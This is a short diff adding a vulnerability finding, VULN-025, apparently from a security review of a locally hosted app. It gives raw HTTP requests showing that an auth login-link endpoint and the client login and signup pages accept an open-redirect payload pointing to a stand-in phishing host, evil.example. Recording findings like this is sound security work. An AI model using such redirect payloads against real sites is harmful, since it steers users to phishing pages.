@@ -1,0 +1,8 @@
+### VULN-025 — server auth-handoff open redirect (raw HTTP 3xx, no browser needed)
+GET http://localhost:21527/api/auth/login-link?token=<VALID>&redirect=//evil.example/phish HTTP/1.1
+Host: localhost:21527
+(no Origin — simulates a cross-site top-level navigation)
+
+### client sinks accept the same payload:
+GET http://localhost:21526/login?redirect=//evil.example/phish
+GET http://localhost:21526/signup?redirect=//evil.example/phish
